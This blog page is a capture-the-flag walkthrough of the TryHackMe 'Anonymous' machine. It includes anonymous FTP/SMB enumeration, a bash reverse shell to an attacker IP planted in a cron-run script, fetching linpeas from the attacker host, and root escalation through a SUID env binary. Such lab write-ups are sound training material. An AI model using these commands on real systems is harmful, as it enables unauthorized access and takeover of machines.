<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Anonymous is a medium difficulty box on TryHackMe. Below is a walkthrough of the steps involved to achieve root on this box.
First, let&rsquo;s scan the box with nmap with nmap -sC -sV -T4 [machine ip]. The results of this scan are as shown below.
It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open.
This are a total of 4 open ports, the answer to Question 1."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" Anonymous - TryHackMe"><meta name=twitter:description content="Anonymous is a medium difficulty box on TryHackMe. Below is a walkthrough of the steps involved to achieve root on this box.
First, let&rsquo;s scan the box with nmap with nmap -sC -sV -T4 [machine ip]. The results of this scan are as shown below.
It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open.
This are a total of 4 open ports, the answer to Question 1."><meta property="og:title" content=" Anonymous - TryHackMe"><meta property="og:description" content="Anonymous is a medium difficulty box on TryHackMe. Below is a walkthrough of the steps involved to achieve root on this box.
First, let&rsquo;s scan the box with nmap with nmap -sC -sV -T4 [machine ip]. The results of this scan are as shown below.
It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open.
This are a total of 4 open ports, the answer to Question 1."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-13-anonymous/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-13T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-13T00:00:00+00:00"><title>Anonymous - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-13-anonymous/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a2eeff1d223fbc3bb6ff964c9089232ebb9cc98ec98ad5e666e532eccccce7b6.css integrity="sha256-ou7/HSI/vDu2/5ZMkIkjLrucyY7JitXmZuUy7MzM57Y=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-13-anonymous/>Anonymous - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-13T00:00:00Z>July 13, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/anonymous/>Anonymous</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/privilege-escalation/>privilege escalation</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/script-modification/>script modification</a></span></div></div></header><div><p>Anonymous is a medium difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below is a walkthrough of the steps involved to achieve root on this box.</p><p>First, let&rsquo;s scan the box with nmap with <strong>nmap -sC -sV -T4 [machine ip]</strong>. The results of this scan are as shown below.</p><p><img src=/assets/img/Anonymous1.png alt="Anonymous nmap"></p><p>It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open.</p><p>This are a total of 4 open ports, the answer to <strong>Question 1</strong>. FTP is running on port 21, the answer to <strong>Question 2</strong>. Ports 139/445 are running smb, the answer to <strong>Question 3</strong>.</p><p>Since we can see that ftp is open anonymously, let&rsquo;s login and take a look with <strong>ftp [machine ip]</strong>. When prompted for the username/password, use <strong>anonymous</strong> for both of them. Once logged in, we can run <strong>ls</strong> to list the directory contents.</p><p><img src=/assets/img/Anonymous2.png alt="Anonymous ftp connect"></p><p>Let&rsquo;s use <strong>cd scripts</strong> to get into the script directory and then type <strong>ls</strong> to list it&rsquo;s contents. Three files are present. Let&rsquo;s run <strong>mget *</strong> to download these files to view them locally.</p><p><img src=/assets/img/Anonymous3.png alt="Anonymous ftp scripts directory"></p><p>Let&rsquo;s use <strong>bye</strong> to close the ftp session and then take a look at these files. Let&rsquo;s start with <strong>cat clean.sh</strong>. This appears to be a script that removes everything in the /tmp directory and then logs it to <strong>/var/ftp/scripts/removed_files.log</strong>.</p><p><img src=/assets/img/Anonymous4.png alt="Anonymous cat clean.sh"></p><p>Next, let&rsquo;s take a look at removed_files.log with <strong>cat removed_files.log</strong>. It doesn&rsquo;t appear that there&rsquo;s anything useful in this, as it is the same log entry repeated several times.</p><p><img src=/assets/img/Anonymous5.png alt="Anonymous cat removed_files.log"></p><p>The last file, which is viewed with <strong>cat to_do.txt</strong>, states that anonymous logins should be disabled because they aren&rsquo;t safe.</p><p><img src=/assets/img/Anonymous6.png alt="Anonymous cat to_do.txt"></p><p>This is likely a hint that anonymous access is available in multiple places. Let&rsquo;s try to enumerate the smb shares next with <strong>smbclient -L \\\\[machine ip]\\</strong>. This will return 3 shares as shown above.</p><p><img src=/assets/img/Anonymous7.png alt="Anonymous list smb shares smbclient"></p><p>The smb share <strong>pics</strong> is the answer to <strong>Question 4</strong>. Let&rsquo;s try to connect to pics anonymously with <strong>smbclient \\\\[machine ip]\\pics -U &ldquo;&rdquo;</strong>. We are also able to connect anonymously and after running <strong>ls</strong>, we see that there are 2 pictures in this folder. Let&rsquo;s grab them both with <strong>mget *</strong>.</p><p><img src=/assets/img/Anonymous8.png alt="Anonymous smbclient anonymous"></p><p>Let&rsquo;s take a look at these two pictures. There&rsquo;s nothing suspicious on the pictures themselves, as they are just pictures of corgis. However, .jpg/.jpeg files can be used for steganography. Let&rsquo;s see if there&rsquo;s any hidden files inside. I ran stegcracker for a few minutes on both of these pictures and was not able to crack the password or confirm anything was hidden inside.</p><p>Let&rsquo;s go back to enumeration using rpcclient. Let&rsquo;s run <strong>rpcclient [machine ip] -U &ldquo;&rdquo;</strong>. Once connected, let&rsquo;s run <strong>enumdomusers</strong> to get the users on this victim host (namelessone) followed by <strong>queryuser 0x3eb</strong> and <strong>getdompwinfo</strong>.</p><p><img src=/assets/img/Anonymous9.png alt="Anonymous rpcclient"></p><p>While useful info, unless we wanted to spend a long time brute forcing the password, there had to be a simpler way to get in. At this point, I logged back in anonymously to the ftp server and noticed that we have read/write/execute on <strong>clean.sh</strong>. I wonder what would happen if we put in a reverse shell to run inside that script? On our local machine, let&rsquo;s open the <strong>clean.sh</strong> file that we downloaded earlier and modify it before we reupload it. Let&rsquo;s add in <strong>bash -i >& /dev/tcp/[your attacker ip]/8080 0>&amp;1</strong> and save the file.</p><p><img src=/assets/img/Anonymous10.png alt="Anonymous modify clean.sh"></p><p>Next, in another terminal window on our attacker pc, run <strong>nc -nvlp 8080</strong> to open a listener on port 8080 that you specified in the clean.sh file above.</p><p><img src=/assets/img/Anonymous11.png alt="Anonymous nc listener"></p><p>Next, let&rsquo;s reconnect with the anonymous ftp site, go into the scripts directory and upload our modified clean.sh file.</p><p><img src=/assets/img/Anonymous12.png alt="Anonymous clean.sh upload"></p><p>Now, we just wait for a connection, as that script appeared to be ran as a cron job. Within a couple of minutes, we now have a shell.</p><p><img src=/assets/img/Anonymous13.png alt="Anonymous reverse shell"></p><p>We are running as namelessone, and after running <strong>pwd</strong> we can see we are in that user&rsquo;s home directory. We can run <strong>ls</strong> and we will see the user.txt file in this directory. <strong>cat user.txt</strong> will get you the answer to <strong>Question 5</strong>.</p><p><img src=/assets/img/Anonymous14.png alt="Anonymous user.txt"></p><p>Let&rsquo;s upgrade our shell so we can run some other commands that require a TTY. Let&rsquo;s upgrade with <strong>python -c &lsquo;import pty; pty.spawn("/bin/sh")&rsquo;</strong>. Attempting to run <strong>sudo -l</strong> requires a password, which we do not have for the user we currently have access to. Let&rsquo;s copy linpeas over to do some enumeration.</p><p>First, on our attacker pc, run <strong>python3 -m http.server</strong> in the directory that linepeas.sh is in. Next, on the victim, run <strong>wget http://[attacker ip]:8000/linpeas.sh</strong>, and it should save in namelessone&rsquo;s home directory. Next, run <strong>chmod 777 linpeas.sh</strong> to make the script executable.</p><p><img src=/assets/img/Anonymous15.png alt="Anonymous wget linpeas.sh"></p><p>Now lets run this with <strong>./linpeas.sh</strong>. While this puts out a lot of information, there is a SUID file that it notices, <strong>/usr/bin/env</strong>.</p><p><img src=/assets/img/Anonymous16.png alt="Anonymous SUID"></p><p><a href=https://gtfobins.github.io/>GTFOBins</a> is a great site to look up ways to exploit executables in Linux. env can be used for privilege escalation with <strong>./env /bin/sh -p</strong>. Now, if we run <strong>whoami</strong> we are the root user! We can now run <strong>cd /root</strong> followed by <strong>ls</strong>. root.txt is in this file, so let&rsquo;s run <strong>cat root.txt</strong> to get the root flag. This is the final challenge and the answer to <strong>Question 6</strong>.</p><p><img src=/assets/img/Anonymous17.png alt="Anonymous root.txt"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>